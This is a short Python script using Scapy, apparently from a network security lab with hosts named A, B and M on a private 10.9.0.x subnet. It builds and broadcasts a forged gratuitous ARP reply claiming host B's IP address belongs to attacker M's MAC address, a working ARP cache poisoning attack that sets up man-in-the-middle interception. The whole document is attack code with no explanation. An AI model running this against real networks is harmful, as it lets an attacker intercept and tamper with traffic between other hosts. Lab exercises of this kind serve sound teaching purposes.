from scapy.all import *
  
# Define
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

arp_gratuitous = Ether(dst="ff:ff:ff:ff:ff:ff", src=MAC_M) / ARP(
    hwsrc=MAC_M,
    psrc=IP_B,
    hwdst="ff:ff:ff:ff:ff:ff",
    pdst=IP_B,
    op=2  # ARP reply
)

# Send
sendp(arp_gratuitous, iface="eth0")